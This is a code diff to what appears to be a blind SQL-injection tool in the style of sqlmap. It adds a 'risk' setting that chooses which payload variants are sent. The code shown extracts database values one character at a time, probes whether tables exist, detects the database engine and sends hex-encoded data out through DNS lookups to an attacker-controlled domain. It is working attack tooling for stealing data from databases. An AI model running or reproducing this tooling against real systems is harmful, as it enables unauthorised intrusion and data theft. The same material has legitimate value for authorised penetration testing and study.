@@ -151,6 +151,7 @@ def send_payloads(args, request, payloads):
 
 
 def extract_char_binary(args, profile, request, domain, log, run_id, expression, pos, alphabet):
+    risk = getattr(args, "risk", 2)
     chars = sorted(set(alphabet))
     if not chars:
         return None
@@ -159,7 +160,7 @@ def extract_char_binary(args, profile, request, domain, log, run_id, expression,
         mid = (lo + hi + 1) // 2
         token = f"{run_id}-p{pos:02d}-b{mid:02x}"
         condition = profile.condition_gte(expression, pos, chars[mid])
-        send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}"))
+        send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}", risk=risk))
         if log.wait_any({token: chars[mid]}, args.timeout):
             lo = mid
         else:
@@ -168,7 +169,7 @@ def extract_char_binary(args, profile, request, domain, log, run_id, expression,
     candidate = chars[lo]
     token_eq = f"{run_id}-p{pos:02d}-c{ord(candidate):02x}"
     condition_eq = profile.condition(expression, pos, candidate)
-    send_payloads(args, request, profile.payloads(args.base, condition_eq, f"{token_eq}.{domain}"))
+    send_payloads(args, request, profile.payloads(args.base, condition_eq, f"{token_eq}.{domain}", risk=risk))
     return candidate if log.wait_any({token_eq: candidate}, args.timeout) else None
 
 
@@ -180,14 +181,15 @@ def run_check(args, profile, request, domain, log, run_id) -> int:
     print(f"  watching  {', '.join(args.log)}")
     _sep()
 
+    risk = getattr(args, "risk", 2)
     true_token = f"{run_id}-true"
     false_token = f"{run_id}-false"
     _log("INFO", "Sending true probe...")
-    send_payloads(args, request, profile.payloads(args.base, args.true_condition, f"{true_token}.{domain}"))
+    send_payloads(args, request, profile.payloads(args.base, args.true_condition, f"{true_token}.{domain}", risk=risk))
     true_hit = log.wait_any({true_token: "true"}, args.timeout)
 
     _log("INFO", "Sending false probe...")
-    send_payloads(args, request, profile.payloads(args.base, args.false_condition, f"{false_token}.{domain}"))
+    send_payloads(args, request, profile.payloads(args.base, args.false_condition, f"{false_token}.{domain}", risk=risk))
     false_hit = log.wait_any({false_token: "false"}, args.timeout)
 
     if true_hit and not false_hit:
@@ -261,12 +263,13 @@ def _extract_value_parallel(args, profile, request, domain, log, run_id, session
             return pos, extract_char_binary(
                 args, profile, request, domain, log, run_id, expression, pos, alphabet
             )
+        risk = getattr(args, "risk", 2)
         token_map: dict[str, str] = {}
         for c in alphabet:
             token = token_for(run_id, pos, c)
             token_map[token] = c
             condition = profile.condition(expression, pos, c)
-            send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}"))
+            send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}", risk=risk))
         token = log.wait_any(token_map, args.timeout)
         return pos, token_map[token] if token else None
 
@@ -301,7 +304,7 @@ def _try_direct_extract(args, profile, request, domain, log, run_id, expression)
     """Try to exfiltrate the full value in one DNS hit (HEX in subdomain).
     Returns the decoded value, or None if unsupported or no callback received."""
     prefix = f"{run_id}-d"
-    payloads = profile.direct_payloads(args.base, expression, prefix, domain)
+    payloads = profile.direct_payloads(args.base, expression, prefix, domain, risk=getattr(args, "risk", 2))
     if not payloads:
         return None
 
@@ -374,7 +377,7 @@ def extract_value(args, expression: str, alphabet: str, max_len: int, show_card:
                 token = token_for(run_id, pos, c)
                 token_map[token] = c
                 condition = profile.condition(expression, pos, c)
-                send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}"))
+                send_payloads(args, request, profile.payloads(args.base, condition, f"{token}.{domain}", risk=getattr(args, "risk", 2)))
             token = log.wait_any(token_map, args.timeout)
             char = token_map[token] if token else None
 
@@ -586,7 +589,7 @@ def _table_exists(args, profile, request, domain, log, run_id, table: str) -> bo
     """Fire one OOB probe to check if a table exists — no full enumeration."""
     condition = f"(SELECT COUNT(*) FROM {table})>=0"
     token = f"{run_id}-tblchk-{table}"
-    send_payloads(args, request, profile.payloads(args.base or "", condition, f"{token}.{domain}"))
+    send_payloads(args, request, profile.payloads(args.base or "", condition, f"{token}.{domain}", risk=getattr(args, "risk", 2)))
     return log.wait_any({token: table}, args.timeout) is not None
 
 
@@ -727,7 +730,7 @@ def _detect_dbms(args) -> str | None:
         base = base or ""
 
         token = f"{run_id}-detect-{profile_name}"
-        for payload in profile.payloads(base, "1=1", f"{token}.{domain}"):
+        for payload in profile.payloads(base, "1=1", f"{token}.{domain}", risk=getattr(args, "risk", 2)):
             if tamper_names:
                 payload = apply_tampers(payload, tamper_names)
 
@@ -916,8 +919,13 @@ def make_parser():
                           "--expr/--dump/enum flag is given)")
     det.add_argument("--level", type=int, choices=range(1, 6), default=1,
                      help="auto-scan depth (no -p): 1=query+body, 2=+cookies, 3=+headers, 5=all (default: 1)")
-    det.add_argument("--risk", type=int, choices=(1, 2, 3), default=1,
-                     help="risk level 1-3 (sqlmap compat, no current effect)")
+    det.add_argument("--risk", type=int, choices=(1, 2, 3), default=2,
+                     help="payload variants tried within the selected profile: "
+                          "1=minimal/stealthy (one variant), "
+                          "2=default fallback set, "
+                          "3=adds comment-terminator variants for stubborn targets "
+                          "(never changes DBMS/profile or enables stacked/cmdshell/dblink) "
+                          "(default: 2)")
     det.add_argument("--true-condition",  default="1=1",
                      help="true SQL condition for check probes (default: 1=1)")
     det.add_argument("--false-condition", default="1=2",
